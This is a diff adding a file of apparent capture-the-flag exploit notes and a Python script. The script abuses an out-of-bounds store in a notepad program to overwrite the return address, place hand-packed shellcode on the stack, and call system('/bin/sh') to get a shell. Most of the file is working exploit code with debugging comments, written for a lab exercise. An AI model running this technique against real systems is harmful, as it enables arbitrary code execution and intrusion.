@@ -1,0 +1,77 @@
+The objective seems to call the get_shell function.
+
+We have a struct with a notepad of size 64 and the lenght of a pin.
+
+#define MAX_FIELD_LEN 32
+#define BUFFER_SIZE 64
+
+struct scratch_space {
+    char notepad[BUFFER_SIZE];
+    unsigned int pin_len;
+} g_scratch_space;
+import interact
+import struct
+
+# Pack integer 'n' into a 8-Byte representation
+def p64(n):
+    return struct.pack('Q', n)
+
+# Unpack 8-Byte-long string 's' into a Python integer
+def u64(s):
+    return struct.unpack('Q', s)[0]
+
+p = interact.Process()
+
+i = 100 #End of our buffer
+while(i<100):   #Used to find the offset
+    p.sendlineafter(b'Input command: ', b"read")
+    p.sendlineafter(b' Index: ', str(i).encode())
+    garbage = p.readuntil(" is ")
+    address = int(p.read().strip())
+    print(f"Address found on offset {i}: {hex(address)}")
+    i = i + 1
+
+#Offset for RIP is 110
+#Our buffer is stored at 0x7fffffffec20 or rbp-0x1b0
+p.sendlineafter(b'Input command: ', b"store")
+p.sendlineafter(b' Number: ', str(int(0xffffec28)).encode())
+p.sendlineafter(b' Index: ', b'110')
+
+p.sendlineafter(b'Input command: ', b"store")
+p.sendlineafter(b' Number: ', str(int(0x00007fff)).encode())
+p.sendlineafter(b' Index: ', b'111')
+
+#Let's print a list of numbers to see how long I can have my payload before it's interrupted:
+reserved_indices = [i for i in range(200) if i % 3 == 1]
+print(reserved_indices)
+
+#It seems I must jump every 2 (when the remaider is 0, 1 and 2) numbers with my shell code!
+#system -> 0x7f000026d390
+#/bin/sh -> find 0x7f0000228000 0x7f00003e8000 /bin/sh -> 0x7f00003b4d57
+#Before I go do the usual shellcode with syscall etc.. what if I load into rdi the /bin/sh and do a jump to system?
+p.sendlineafter(b'Input command: ', b"store")
+p.sendlineafter(b' Number: ', str(int(0x4d57bf48)).encode())
+p.sendlineafter(b' Index: ', b'5')
+
+#Insane that it actually worked wtfXD
+#rdi: 0x00007f00003b4d57
+p.sendlineafter(b'Input command: ', b"store")
+p.sendlineafter(b' Number: ', str(int(0x000007f00003b)).encode())
+p.sendlineafter(b' Index: ', b'6')
+
+#It crashes because:
+#0x7fffffffec28: movabs rdi, 0x7f00003b4d57
+#0x7fffffffec32: add byte ptr [rax], al
+#rax is 0x00... so when it tries to dereference it will crash. What if we move a valid address to rax?
+#We do it first so the next few \x00 instruction will not crash and execute the code
+#Fuzzed again and got this address: 0x400a9f
+#p.sendlineafter(b'Input command: ', b"store")
+#p.sendlineafter(b' Number: ', str(int(0x9fc0c748)).encode())
+#p.sendlineafter(b' Index: ', b'2')
+
+#p.sendlineafter(b'Input command: ', b"store")
+#p.sendlineafter(b' Number: ', str(int(0x400a)).encode())
+#p.sendlineafter(b' Index: ', b'3')
+
+
+
